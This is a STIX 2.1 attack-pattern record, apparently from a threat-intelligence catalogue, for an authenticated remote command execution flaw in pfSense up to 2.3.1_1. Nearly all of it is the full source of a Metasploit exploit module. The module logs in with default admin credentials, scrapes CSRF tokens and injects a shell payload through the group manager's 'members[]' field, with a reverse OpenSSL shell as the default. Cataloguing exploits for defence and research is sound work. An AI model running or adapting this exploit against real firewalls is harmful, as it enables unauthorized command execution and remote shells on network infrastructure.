{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--f6d39120-49e7-42a2-90cc-a208bd4e43cf",
    "created": "2024-08-14T17:14:37.596025Z",
    "modified": "2024-08-14T17:14:37.59603Z",
    "name": "pfSense authenticated group member RCE",
    "description": "( pfSense, a free BSD based open source firewall distribution version <= 2.3.1_1 contains a remote command execution vulnerability post authentication in the system_groupmanager.php page. Verified against 2.2.6 and 2.3. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/unix/http/pfsense_group_member_exec.rb",
            "external_id": "pfsense_group_member_exec.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.pfsense.org/security/advisories/pfSense-SA-16_08.webgui.asc"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'        => 'pfSense authenticated group member RCE',\n        'Description' => %q(\n          pfSense, a free BSD based open source firewall distribution,\n          version <= 2.3.1_1 contains a remote command execution\n          vulnerability post authentication in the system_groupmanager.php page.\n          Verified against 2.2.6 and 2.3.\n        ),\n        'Author'      =>\n          [\n            's4squatch', # discovery\n            'h00die'     # module\n          ],\n        'References'  =>\n          [\n            [ 'EDB', '43128' ],\n            [ 'URL', 'https://www.pfsense.org/security/advisories/pfSense-SA-16_08.webgui.asc']\n          ],\n        'License'        => MSF_LICENSE,\n        'Platform'       => 'unix',\n        'Privileged'     => false,\n        'DefaultOptions' =>\n          {\n            'SSL' => true,\n            'PAYLOAD' => 'cmd/unix/reverse_openssl'\n          },\n        'Arch'           => [ ARCH_CMD ],\n        'Payload'        =>\n          {\n            'Compat' =>\n              {\n                'PayloadType' => 'cmd',\n                'RequiredCmd' => 'perl openssl'\n              }\n          },\n        'Targets'        =>\n          [\n            [ 'Automatic Target', {}]\n          ],\n        'DefaultTarget' => 0,\n        'DisclosureDate' => '2017-11-06'\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [ true, 'User to login with', 'admin']),\n        OptString.new('PASSWORD', [ false, 'Password to login with', 'pfsense']),\n        Opt::RPORT(443)\n      ], self.class\n    )\n  end\n\n  def login\n    res = send_request_cgi(\n      'uri' => '/index.php',\n      'method' => 'GET'\n    )\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code != 200\n\n    /var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n    vprint_status(\"CSRF Token for login: #{csrf}\")\n\n    res = send_request_cgi(\n      'uri' => '/index.php',\n      'method' => 'POST',\n      'vars_post' => {\n        '__csrf_magic' => csrf,\n        'usernamefld'  => datastore['USERNAME'],\n        'passwordfld'  => datastore['PASSWORD'],\n        'login'        => ''\n      }\n    )\n    unless res\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to authentication request\")\n    end\n    if res.code == 302\n      vprint_status('Successful Authentication')\n      return res.get_cookies\n    else\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Authentication Failed: #{datastore['USERNAME']}:#{datastore['PASSWORD']}\")\n      return nil\n    end\n  end\n\n  def detect_version(cookie)\n    res = send_request_cgi(\n      'uri' => '/index.php',\n      'method' => 'GET',\n      'cookie' => cookie\n    )\n    unless res\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Did not respond to authentication request\")\n    end\n    /Version.+<strong>(?<version>[0-9\\.\\-RELEASE]+)[\\n]?<\\/strong>/m =~ res.body\n    if version\n      print_status(\"pfSense Version Detected: #{version}\")\n      return Rex::Version.new(version)\n    end\n    # If the device isn't fully setup, you get stuck at redirects to wizard.php\n    # however, this does NOT stop exploitation strangely\n    print_error(\"pfSens Version Not Detected or wizard still enabled.\")\n    Rex::Version.new('0.0')\n  end\n\n  def check\n    begin\n      res = send_request_cgi(\n        'uri'       => '/index.php',\n        'method'    => 'GET'\n      )\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Invalid credentials (response code: #{res.code})\") if res.code != 200\n      if /Login to pfSense/ =~ res.body\n        Exploit::CheckCode::Detected\n      else\n        Exploit::CheckCode::Safe\n      end\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\n\n  def exploit\n    begin\n      cookie = login\n      version = detect_version(cookie)\n      vprint_good('Login Successful')\n      res = send_request_cgi(\n        'uri'    => '/system_groupmanager.php',\n        'method' => 'GET',\n        'cookie' => cookie,\n        'vars_get' => {\n          'act' => 'new'\n        }\n      )\n\n      /var csrfMagicToken = \"(?<csrf>sid:[a-z0-9,;:]+)\";/ =~ res.body\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Could not determine CSRF token\") if csrf.nil?\n      vprint_status(\"CSRF Token for group creation: #{csrf}\")\n\n      group_name = rand_text_alpha(10)\n      post_vars = {\n        '__csrf_magic' => csrf,\n        'groupname' => group_name,\n        'description' => '',\n        'members[]' => \"0';#{payload.encoded};'\",\n        'groupid' => '',\n        'save' => 'Save'\n      }\n      if version >= Rex::Version.new('2.3')\n        post_vars = post_vars.merge('gtype' => 'local')\n      elsif version <= Rex::Version.new('2.3') # catch for 2.2.6. left this elsif for easy expansion to other versions as needed\n        post_vars = post_vars.merge(\n          'act' => '',\n          'gtype' => '',\n          'privid' => ''\n        )\n      end\n      send_request_cgi(\n        'uri'           => '/system_groupmanager.php',\n        'method'        => 'POST',\n        'cookie'        => cookie,\n        'vars_post'     => post_vars,\n        'vars_get' => {\n          'act' => 'edit'\n        }\n      )\n      print_status(\"Manual removal of group #{group_name} is required.\")\n    rescue ::Rex::ConnectionError\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2017-11-06",
    "x_mitre_platforms": [
        "unix'"
    ]
}